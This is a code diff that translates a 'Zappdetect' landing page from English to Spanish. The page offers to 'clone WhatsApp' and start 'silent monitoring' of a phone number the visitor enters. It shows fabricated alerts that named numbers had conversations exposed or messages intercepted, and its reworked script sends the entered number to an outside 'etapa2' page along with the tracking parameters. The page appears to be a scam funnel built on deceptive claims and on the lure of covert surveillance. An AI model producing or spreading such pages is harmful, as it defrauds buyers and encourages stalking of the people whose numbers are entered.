@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Zappdetect - Number</title>
+    <title>Zappdetect - Número</title>
     <link href="css/bootstrap.minsas.css" rel="stylesheet">
     <link href="css/numerosas.css" rel="stylesheet">
     <link rel="preload" href="css/intlTelInputsas.css" as="style">
@@ -18,30 +18,63 @@
             font-weight: 500;
             display: none;
         }
+        .iti__flag {
+            background-image: none !important;
+        }
+        .iti__flag:before {
+            content: "🇺🇸"; /* Bandeira padrão */
+            font-size: 20px;
+            line-height: 1;
+        }
+        .iti__country[data-country-code="us"] .iti__flag:before { content: "🇺🇸"; }
+        .iti__country[data-country-code="br"] .iti__flag:before { content: "🇧🇷"; }
+        .iti__country[data-country-code="gb"] .iti__flag:before { content: "🇬🇧"; }
+        .iti__country[data-country-code="pt"] .iti__flag:before { content: "🇵🇹"; }
+        .iti__country[data-country-code="au"] .iti__flag:before { content: "🇦🇺"; }
+        .iti__country[data-country-code="ca"] .iti__flag:before { content: "🇨🇦"; }
+        .iti__country[data-country-code="es"] .iti__flag:before { content: "🇪🇸"; }
+        .iti__country[data-country-code="mx"] .iti__flag:before { content: "🇲🇽"; }
+        .iti__country[data-country-code="ar"] .iti__flag:before { content: "🇦🇷"; }
+        .iti__country[data-country-code="co"] .iti__flag:before { content: "🇨🇴"; }
+        .iti__country[data-country-code="cl"] .iti__flag:before { content: "🇨🇱"; }
+        .iti__country[data-country-code="pe"] .iti__flag:before { content: "🇵🇪"; }
+        .iti__country[data-country-code="ve"] .iti__flag:before { content: "🇻🇪"; }
+        .iti__country[data-country-code="do"] .iti__flag:before { content: "🇩🇴"; }
+        .iti__country[data-country-code="ec"] .iti__flag:before { content: "🇪🇨"; }
+        .iti__country[data-country-code="gt"] .iti__flag:before { content: "🇬🇹"; }
+        .iti__country[data-country-code="cu"] .iti__flag:before { content: "🇨🇺"; }
+        .iti__country[data-country-code="bo"] .iti__flag:before { content: "🇧🇴"; }
+        .iti__country[data-country-code="sv"] .iti__flag:before { content: "🇸🇻"; }
+        .iti__country[data-country-code="hn"] .iti__flag:before { content: "🇭🇳"; }
+        .iti__country[data-country-code="py"] .iti__flag:before { content: "🇵🇾"; }
+        .iti__country[data-country-code="ni"] .iti__flag:before { content: "🇳🇮"; }
+        .iti__country[data-country-code="cr"] .iti__flag:before { content: "🇨🇷"; }
+        .iti__country[data-country-code="pa"] .iti__flag:before { content: "🇵🇦"; }
+        .iti__country[data-country-code="uy"] .iti__flag:before { content: "🇺🇾"; }
     </style>
     <script src="js/latestsas.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
 </head>
 <body>
 <div class="container-fluid container-total">
     <div class="d-flex justify-content-between align-items-center p-3 border-bottom">
-        <img src="https://i.postimg.cc/Vkk2Vdb2/icone-menu.png" class="img1-icone-menu-p1">
-        <img src="https://i.postimg.cc/43KqXqP5/icone-nome-zap.png" class="img3-icone-menu-p1">
-        <img src="https://i.postimg.cc/MT7sTSQy/icone-download.png" class="img2-icone-menu-p1">
+        <img src="/images/icone-menusas.png" class="img1-icone-menu-p1">
+        <img src="/images/icone-nome-zapsas.png" class="img3-icone-menu-p1">
+        <img src="etapa1es/images/icone-downloadsas.png" class="img2-icone-menu-p1">
     </div>
     <div class="row justify-content-center text-center mt-5">
         <div class="col-10 col-md-6 col-lg-5 mt-3">
-            <h2 class="h2-p1"><b>Congratulations, you've earned 1 free access!</b></h2>
+            <h2 class="h2-p1"><b>¡Felicidades, has ganado 1 acceso gratis!</b></h2>
         </div>
         <div class="col-12"></div>
         <div class="col-10 col-md-6 col-lg-4 mt-3">
-            <h5 class="h5-p2">Enter the number below and start silent monitoring.</h5>
+            <h5 class="h5-p2">Ingresa el número a continuación y comienza el monitoreo silencioso.</h5>
         </div>
         <div class="col-12"></div>
         <div class="col-10 col-md-6 col-lg-4 mt-3">
-            <form id="phoneForm" action="/carregando" method="post">
+            <form id="phoneForm" method="post">
                 <input value="" name="sexo" class="d-none">
                 <div class="w-100">
-                    <input class="form-control" type="tel" id="telefone" name="numero" placeholder="Enter phone number" required="" style="width: 100% !important;">
+                    <input class="form-control" type="tel" id="telefone" name="numero" placeholder="Ingresa número de teléfono" required="" style="width: 100% !important;">
                     <div id="error-msg"></div>
                 </div>
 
@@ -50,10 +83,10 @@
                 <input class="d-none" name="country_code" id="country_code">
                 <input class="d-none" name="local_number" id="local_number">
                 <div id="error-msg" class="error"></div>
-                <button class="btn-clonar-p2">
+                <button type="button" class="btn-clonar-p2" id="btnSubmit">
                     <div class="d-flex align-items-center justify-content-center">
                         <img class="img1-icone-menu-p1 me-2" src="images/icone-cadeadosas.png">
-                        <span class="texto-btn">Clone WhatsApp Now</span>
+                        <span class="texto-btn">Clonar WhatsApp Ahora</span>
                     </div>
                 </button>
             </form>
@@ -63,19 +96,19 @@
             <div class="caixa text-start" id="caixa1">
                 <img class="me-2" src="images/icone-checksas.png">
                 <span>
-            (312) 995-XX31 had conversations exposed!
+            ¡(312) 995-XX31 tuvo conversaciones expuestas!
         </span>
             </div>
             <div class="caixa text-start" id="caixa2">
                 <img class="me-2" src="images/icone-checksas.png">
                 <span>
-            (213) 983-XX50 from Los Angeles was granted monitoring access!
+            ¡(213) 983-XX50 de Los Ángeles obtuvo acceso de monitoreo!
         </span>
             </div>
             <div class="caixa text-start" id="caixa3">
                 <img class="me-2" src="images/icone-checksas.png">
                 <span>
-            (305) 938-XX71 had messages intercepted!
+            ¡(305) 938-XX71 tuvo mensajes interceptados!
         </span>
             </div>
         </div>
@@ -83,13 +116,19 @@
     </div>
     <div class="rodape-fixo p-3 d-none d-md-block">
         <div class="mb-2 d-flex justify-content-center">
-            <div><a><small>Privacy Policy</small></a></div>
-            <div class="mx-5"><a><small>Terms of Use</small></a></div>
-            <div><a><small>Email Support</small></a></div>
+            <div><a><small>Política de Privacidad</small></a></div>
+            <div class="mx-5"><a><small>Términos de Uso</small></a></div>
+            <div><a><small>Soporte por Email</small></a></div>
         </div>
-        <small>© 2024 Protect Your Relationship. All rights reserved.</small>
+        <small>© 2024 Protege Tu Relación. Todos los derechos reservados.</small>
     </div>
-   
+    <div class="cookies shadow shadow-lg" id="cookies">
+        <div class="d-flex justify-content-center align-items-center p-3">
+            <span>Este sitio utiliza cookies para mejorar tu experiencia. Al continuar, aceptas nuestra política.</span>
+            <button class="ms-2 btn-aceitar-cookies px-2 py-1" onclick="aceitar_cookies()">Aceptar</button>
+        </div>
+    </div>
+</div>
 
 <script src="js/bootstrapsas.bundle.js"></script>
 <script src="js/intlTelInputsas.min.js" defer=""></script>
@@ -100,6 +139,7 @@
         const phoneInput = document.querySelector("#telefone");
         const errorMsg = document.querySelector("#error-msg");
         const form = document.querySelector("#phoneForm");
+        const btnSubmit = document.querySelector("#btnSubmit");
       
         // Primeiro obtemos a localização do usuário
         $.get("https://ipinfo.io/json", function (response) {
@@ -108,44 +148,43 @@
             const iti = window.intlTelInput(phoneInput, {
                 separateDialCode: true,
                 utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
-                preferredCountries: ["us", "br", "gb", "pt", "au", "ca"],
+                preferredCountries: ["us", "br", "gb", "pt", "au", "ca", "es", "mx", "ar", "co"],
                 initialCountry: countryCode,
                 autoPlaceholder: "polite",
                 formatOnDisplay: true,
                 width: "100px"
             });
 
-            form.addEventListener("submit", function (e) {
-                if (!iti.isValidNumber()) {
-                    e.preventDefault();
-                    errorMsg.textContent = "Número inválido. Por favor, verifique.";
-                    errorMsg.style.display = "block";
-                    return;
-                }
-
-                const fullNumber = iti.getNumber(); // ex: +5511912345678
-                const countryCode = "+" + iti.getSelectedCountryData().dialCode; // ex: +55
-                const localNumber = fullNumber.replace(countryCode, ""); // ex: 11912345678
-
-                // Preenche os campos ocultos
-                document.querySelector("#full_number").value = fullNumber;
-                document.querySelector("#country_code").value = countryCode;
-                document.querySelector("#local_number").value = localNumber;
-
-                errorMsg.style.display = "none";
+            btnSubmit.addEventListener("click", function (e) {
+                e.preventDefault();
                 
-                localStorage.setItem("telefoneFormatado", fullNumber);
-                // Descomente para envio real:
-                // form.submit();
+                const fullNumber = iti.getNumber() || phoneInput.value; // Obtém o número formatado ou o valor bruto
+                
+                // Preserva os parâmetros UTM da URL atual
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmParams = [];
+                
+                for (const [key, value] of urlParams) {
+                    if (key.startsWith('utm_')) {
+                        utmParams.push(`${key}=${encodeURIComponent(value)}`);
+                    }
+                }
+                
+                // Constrói a URL de redirecionamento
+                let redirectUrl = `https://acessoprivado.online/etapa2/?tel=${encodeURIComponent(fullNumber)}`;
+                
+                // Adiciona os parâmetros UTM se existirem
+                if (utmParams.length > 0) {
+                    redirectUrl += `&${utmParams.join('&')}`;
+                }
+                
+                // Redireciona para a URL
+                window.location.href = redirectUrl;
             });
 
             phoneInput.addEventListener("input", function () {
-                if (iti.isValidNumber()) {
-                    phoneInput.style.borderColor = "#006B54";
-                    errorMsg.style.display = "none";
-                } else {
-                    phoneInput.style.borderColor = "#e0e0e0";
-                }
+                // Remove qualquer mensagem de erro quando o usuário digitar
+                errorMsg.style.display = "none";
             });
             
         }, "jsonp");
